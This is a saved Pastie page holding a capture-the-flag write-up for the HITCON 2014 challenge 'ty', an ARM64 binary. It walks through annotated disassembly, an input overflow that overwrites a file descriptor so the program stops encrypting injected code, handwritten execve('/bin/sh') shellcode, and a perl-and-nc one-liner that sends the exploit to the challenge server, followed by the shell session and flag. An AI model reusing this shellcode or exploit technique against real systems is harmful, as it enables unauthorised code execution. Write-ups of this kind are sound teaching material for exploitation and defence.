<html><head id="head">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"queueTime":0,"errorBeacon":"bam.nr-data.net","agent":"js-agent.newrelic.com/nr-411.min.js","applicationTime":41,"extra":"","agentToken":null,"licenseKey":"4f1b2792f0","transactionName":"Jw4PQUVeXVxXRR8TUBcVBEYYRVRIRg==","beacon":"beacon-5.newrelic.com","applicationID":"10734","ttGuid":""}</script>
<script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o?o:n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({D5DuLP:[function(t,n){function e(t,n){var e=r[t];return e?e.apply(this,n):(o[t]||(o[t]=[]),void o[t].push(n))}var r={},o={};n.exports=e,e.queues=o,e.handlers=r},{}],handle:[function(t,n){n.exports=t("D5DuLP")},{}],G9z0Bl:[function(t,n){function e(){var t=l.info=NREUM.info;if(t&&t.agent&&t.licenseKey&&t.applicationID&&p&&p.body){l.proto="https"===f.split(":")[0]||t.sslForHttp?"https://":"http://",i("mark",["onload",a()]);var n=p.createElement("script");n.src=l.proto+t.agent,p.body.appendChild(n)}}function r(){"complete"===p.readyState&&o()}function o(){i("mark",["domContent",a()])}function a(){return(new Date).getTime()}var i=t("handle"),u=window,p=u.document,s="addEventListener",c="attachEvent",f=(""+location).split("?")[0],l=n.exports={offset:a(),origin:f,features:[]};p[s]?(p[s]("DOMContentLoaded",o,!1),u[s]("load",e,!1)):(p[c]("onreadystatechange",r),u[c]("onload",e)),i("mark",["firstbyte",a()])},{handle:"D5DuLP"}],loader:[function(t,n){n.exports=t("G9z0Bl")},{}]},{},["G9z0Bl"]);</script>
<title>Private Paste - Pastie</title>
<link rel="icon" type="image/gif" href="http://pastie.org/images/pastie.gif">
<link rel="SHORTCUT ICON" type="image/gif" href="http://pastie.org/images/pastie.gif">
</head>
<body>
<pre>Writeup for Hitcon2014 Challenge ty<br>by @_cutz<br><br>$ file ty-b83f0d0edeb8cfad76d30eddc58da139<br>ty-b83f0d0edeb8cfad76d30eddc58da139: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.7.0, BuildID[sha1]=a72f76067f5d6eec22db05df0472af130e242027, not stripped: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.7.0, BuildID[sha1]=a72f76067f5d6eec22db05df0472af130e242027, not stripped<br><br>$ checksec.sh --file ty-b83f0d0edeb8cfad76d30eddc58da139 <br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE<br>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ty-b83f0d0edeb8cfad76d30eddc58da139<br><br>Set up a Qemu armv8 Box:<br>- Configure and compile Qemu with ./configure --target-list=aarch64-softmmu &amp;&amp; make<br>- $ wget http://people.linaro.org/~alex.bennee/images/aarch64-linux-3.16-buildroot-gdb.img<br>- $ ./qemu-system-aarch64 -machine virt -cpu cortex-a57 -machine type=virt -nographic -smp 1 -m 2048 -kernel aarch64-linux-3.16-buildroot-gdb.img --append "console=ttyAMA0"<br>- Transfer the Binary via uuencode or other magic<br><br>Disassembly:<br><br>Dump of assembler code for function main:<br>   0x0000000000400630 &lt;+0&gt;:     stp     x29, x30, [sp,#-64]!<br>   0x0000000000400634 &lt;+4&gt;:     mov     x29, sp<br>   0x0000000000400638 &lt;+8&gt;:     mov     w0, #0x1e                       // #30<br>   0x000000000040063c &lt;+12&gt;:    stp     x19, x20, [sp,#16]<br>   0x0000000000400640 &lt;+16&gt;:    stp     x21, x22, [sp,#32]<br>   0x0000000000400644 &lt;+20&gt;:    bl      0x400620 &lt;alarm@plt&gt;<br>   0x0000000000400648 &lt;+24&gt;:    adrp    x0, 0x400000<br>   0x000000000040064c &lt;+28&gt;:    mov     w1, #0x0                        // #0<br>   0x0000000000400650 &lt;+32&gt;:    add     x0, x0, #0x9d0<br>   0x0000000000400654 &lt;+36&gt;:    bl      0x4005a0 &lt;open@plt&gt;		// open /dev/urandom, 0<br>   0x0000000000400658 &lt;+40&gt;:    str     w0, [x29,#56]			// save fd to [x29,#56]<br>   0x000000000040065c &lt;+44&gt;:    mov     w1, #0x8                        // #8 byte length<br>   0x0000000000400660 &lt;+48&gt;:    add     x0, x29, #0x30			// readline to x29+0x30 (read from fd 0 till byte 0xa)<br>   0x0000000000400664 &lt;+52&gt;:    bl      0x4008a8 &lt;readline&gt;<br>   0x0000000000400668 &lt;+56&gt;:    add     x0, x29, #0x30<br>   0x000000000040066c &lt;+60&gt;:    mov     x1, #0x0                        // #0<br>   0x0000000000400670 &lt;+64&gt;:    mov     w2, #0xa                        // #10<br>   0x0000000000400674 &lt;+68&gt;:    bl      0x4005f0 &lt;strtol@plt&gt;		// strtol x29+#0x30, 0, 10 (basis 10)<br>   0x0000000000400678 &lt;+72&gt;:    cmp     w0, #0x100			// &gt; 0x100 ?<br>   0x000000000040067c &lt;+76&gt;:    mov     x20, x0<br>   0x0000000000400680 &lt;+80&gt;:    b.hi    0x40071c &lt;main+236&gt;		// true =&gt; main+236 (unsigned)<br>   0x0000000000400684 &lt;+84&gt;:    adrp    x21, 0x411000 &lt;_exit@got.plt<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>&gt;<br>   0x0000000000400688 &lt;+88&gt;:    and     x19, x0, #0xffffffff<br>   0x000000000040068c &lt;+92&gt;:    add     x21, x21, #0x468<br>   0x0000000000400690 &lt;+96&gt;:    mov     w0, #0x0                        // #0<br>   0x0000000000400694 &lt;+100&gt;:   mov     x1, x21<br>   0x0000000000400698 &lt;+104&gt;:   mov     x2, x19<br>   0x000000000040069c &lt;+108&gt;:   mov     x3, #0x400                      // #1024<br>   0x00000000004006a0 &lt;+112&gt;:   bl      0x400600 &lt;__read_chk@plt&gt;	// read(0, 0x411000+0x468&lt;code&gt;, strtol, 0x400)<br>   0x00000000004006a4 &lt;+116&gt;:   cmp     x19, x0				// check if num bytes read are same as strtol<br>   0x00000000004006a8 &lt;+120&gt;:   b.ne    0x400730 &lt;main+256&gt;		// otherwise -&gt; fail<br>   0x00000000004006ac &lt;+124&gt;:   adrp    x22, 0x411000 &lt;_exit@got.plt<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>&gt;<br>   0x00000000004006b0 &lt;+128&gt;:   add     x22, x22, #0x68<br>   0x00000000004006b4 &lt;+132&gt;:   ldr     w0, [x29,#56]<br>   0x00000000004006b8 &lt;+136&gt;:   mov     x1, x22<br>   0x00000000004006bc &lt;+140&gt;:   mov     x2, x19<br>   0x00000000004006c0 &lt;+144&gt;:   mov     x3, #0x400                      // #1024<br>   0x00000000004006c4 &lt;+148&gt;:   bl      0x400600 &lt;__read_chk@plt&gt;	// read(urandom_fd, 0x411000+0x68&lt;rnd&gt;, strtol, 0x400)<br>   0x00000000004006c8 &lt;+152&gt;:   cmp     x19, x0				// check if num bytes read are same as strtol<br>   0x00000000004006cc &lt;+156&gt;:   b.ne    0x400730 &lt;main+256&gt;		// otherwise -&gt; fail<br>   0x00000000004006d0 &lt;+160&gt;:   cbz     w20, 0x400704 &lt;main+212&gt;<br>   0x00000000004006d4 &lt;+164&gt;:   sub     w5, w20, #0x1<br>   0x00000000004006d8 &lt;+168&gt;:   add     x5, x5, #0x1<br>   0x00000000004006dc &lt;+172&gt;:   mov     x0, #0x0                        // #0<br>   0x00000000004006e0 &lt;+176&gt;:   mov     x2, x21<br>   0x00000000004006e4 &lt;+180&gt;:   mov     x1, x22<br>   0x00000000004006e8 &lt;+184&gt;:   ldrb    w3, [x0,x2]			//<br>   0x00000000004006ec &lt;+188&gt;:   ldrb    w4, [x0,x1]			//<br>   0x00000000004006f0 &lt;+192&gt;:   eor     w3, w4, w3			//<br>   0x00000000004006f4 &lt;+196&gt;:   strb    w3, [x0,x2]			//<br>   0x00000000004006f8 &lt;+200&gt;:   add     x0, x0, #0x1			//<br>   0x00000000004006fc &lt;+204&gt;:   cmp     x0, x5				// for (i = 0; i &lt; stroul; i++)<br>   0x0000000000400700 &lt;+208&gt;:   b.ne    0x4006e8 &lt;main+184&gt;		//	code[i] ^= rnd[i];<br>   0x0000000000400704 &lt;+212&gt;:   bl      0x411468 &lt;code&gt;			// jmp to code<br>   0x0000000000400708 &lt;+216&gt;:   mov     w0, #0x0                        // #0<br>   0x000000000040070c &lt;+220&gt;:   ldp     x19, x20, [sp,#16]<br>   0x0000000000400710 &lt;+224&gt;:   ldp     x21, x22, [sp,#32]<br>   0x0000000000400714 &lt;+228&gt;:   ldp     x29, x30, [sp],#64<br>   0x0000000000400718 &lt;+232&gt;:   ret<br>   0x000000000040071c &lt;+236&gt;:   adrp    x0, 0x400000<br>   0x0000000000400720 &lt;+240&gt;:   add     x0, x0, #0x9e0<br>   0x0000000000400724 &lt;+244&gt;:   bl      0x4005e0 &lt;puts@plt&gt;<br>   0x0000000000400728 &lt;+248&gt;:   mov     w0, #0x0                        // #0<br>   0x000000000040072c &lt;+252&gt;:   bl      0x400590 &lt;_exit@plt&gt;<br>   0x0000000000400730 &lt;+256&gt;:   adrp    x0, 0x400000<br>   0x0000000000400734 &lt;+260&gt;:   add     x0, x0, #0x9f0<br>   0x0000000000400738 &lt;+264&gt;:   bl      0x4005e0 &lt;puts@plt&gt;<br>   0x000000000040073c &lt;+268&gt;:   mov     w0, #0x0                        // #0<br>   0x0000000000400740 &lt;+272&gt;:   bl      0x400590 &lt;_exit@plt&gt;<br>   <br><br>Dump of assembler code for function readline:<br>   0x00000000004008a8 &lt;+0&gt;:     stp     x29, x30, [sp,#-48]!<br>   0x00000000004008ac &lt;+4&gt;:     mov     x29, sp<br>   0x00000000004008b0 &lt;+8&gt;:     stp     x21, x22, [sp,#32]<br>   0x00000000004008b4 &lt;+12&gt;:    stp     x19, x20, [sp,#16]<br>   0x00000000004008b8 &lt;+16&gt;:    mov     w21, w1<br>   0x00000000004008bc &lt;+20&gt;:    mov     x22, x0<br>   0x00000000004008c0 &lt;+24&gt;:    mov     x19, x0<br>   0x00000000004008c4 &lt;+28&gt;:    cbz     w1, 0x400904 &lt;readline+92&gt;<br>   0x00000000004008c8 &lt;+32&gt;:    mov     w20, #0x0                       // #0<br>   0x00000000004008cc &lt;+36&gt;:    b       0x4008e8 &lt;readline+64&gt;<br>   0x00000000004008d0 &lt;+40&gt;:    ldrb    w2, [x19]<br>   0x00000000004008d4 &lt;+44&gt;:    cmp     w2, #0xa<br>   0x00000000004008d8 &lt;+48&gt;:    b.eq    0x400904 &lt;readline+92&gt;<br>   0x00000000004008dc &lt;+52&gt;:    cmp     w20, w21<br>   0x00000000004008e0 &lt;+56&gt;:    add     x19, x19, #0x1<br>   0x00000000004008e4 &lt;+60&gt;:    b.eq    0x40091c &lt;readline+116&gt;<br>   0x00000000004008e8 &lt;+64&gt;:    mov     x1, x19<br>   0x00000000004008ec &lt;+68&gt;:    mov     w0, #0x0                        // #0<br>   0x00000000004008f0 &lt;+72&gt;:    mov     x2, #0x1                        // #1<br>   0x00000000004008f4 &lt;+76&gt;:    bl      0x400610 &lt;read@plt&gt;<br>   0x00000000004008f8 &lt;+80&gt;:    cmp     x0, #0x1<br>   0x00000000004008fc &lt;+84&gt;:    add     w20, w20, #0x1<br>   0x0000000000400900 &lt;+88&gt;:    b.eq    0x4008d0 &lt;readline+40&gt;<br>   0x0000000000400904 &lt;+92&gt;:    strb    wzr, [x19]<br>   0x0000000000400908 &lt;+96&gt;:    mov     w0, #0x0                        // #0<br>   0x000000000040090c &lt;+100&gt;:   ldp     x19, x20, [sp,#16]<br>   0x0000000000400910 &lt;+104&gt;:   ldp     x21, x22, [sp,#32]<br>   0x0000000000400914 &lt;+108&gt;:   ldp     x29, x30, [sp],#48<br>   0x0000000000400918 &lt;+112&gt;:   ret<br>   0x000000000040091c &lt;+116&gt;:   add     x19, x22, w20, uxtw<br>   0x0000000000400920 &lt;+120&gt;:   strb    wzr, [x19]			// write zero register to current pos which is the last newline<br>   0x0000000000400924 &lt;+124&gt;:   mov     w0, #0x0                        // #0<br>   0x0000000000400928 &lt;+128&gt;:   ldp     x19, x20, [sp,#16]<br>   0x000000000040092c &lt;+132&gt;:   ldp     x21, x22, [sp,#32]<br>   0x0000000000400930 &lt;+136&gt;:   ldp     x29, x30, [sp],#48<br>   0x0000000000400934 &lt;+140&gt;:   ret<br>End of assembler dump.<br><br>fd from open(/dev/urandom) can be overwritten by Newline which then again will be overwritten by wzr: Makes read() use fd 0 again.<br><br>$ echo -e "00000027\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAA" &gt; file<br>$ ./ty-b83f0d0edeb8cfad76d30eddc58da139 &lt; file<br><br>Program terminated with signal 4, Illegal instruction.<br>#0  0x0000000000411468 in code ()<br>(gdb) x/10xw &amp;code<br>0x411468 &lt;code&gt;:        0x41414141      0x41414141      0x41414141      0x41414141<br>0x411478 &lt;code+16&gt;:     0x41414141      0x41414141      0x00414141<br><br>- Write some witty shellcode<br>- Assemble with tools from http://releases.linaro.org/latest/components/toolchain/binaries/<br><br>$ cat sc.asm<br>.global _start<br><br>.text<br><br>_start:<br>adr x0, pc<br>add x0, x0, 24<br>sub x1, x1, x1<br>sub x2, x2, x2<br>mov x8, 221<br>svc 0<br><br>$ ./aarch64_be-none-elf-as sc.asm<br>$ ./aarch64_be-none-elf-objdump -d a.out<br><br>a.out:     file format elf64-bigaarch64<br>Disassembly of section .text:<br><br>0000000000000000 &lt;_start&gt;:<br>   0:   10000000        adr     x0, 0 &lt;pc&gt;<br>   4:   91006000        add     x0, x0, #0x18<br>   8:   cb010021        sub     x1, x1, x1<br>   c:   cb020042        sub     x2, x2, x2<br>  10:   d2801ba8        mov     x8, #0xdd                       // #221<br>  14:   d4000001        svc     #0x0<br><br>- Append /bin/sh and it will execve(/bin/sh, 0, 0)<br><br>$ (perl -e 'print "00000031" . "\x00"x31 . pack("I", 0x10000000) . pack("I", 0x91006000) . pack("I", 0xcb010021) . pack("I", 0xcb020042) . pack("I", 0xd2801ba8) . pack("I", 0xd4000001) . "/bin/sh"'; cat) | nc 210.71.253.109 9123<br>id<br>uid=2134168284 gid=1001(ty)<br>cd /home<br>ls<br>judge<br>ty<br>cd ty<br>cat flag<br>HITCON{HAve_FuN_4_NXTGen_P1at4|m}<br>
</pre>


<script src="Private%20Paste%20-%20Pastie_files/nr-411.js"></script><script src="Private%20Paste%20-%20Pastie_files/4f1b2792f0" type="text/javascript"></script></body></html>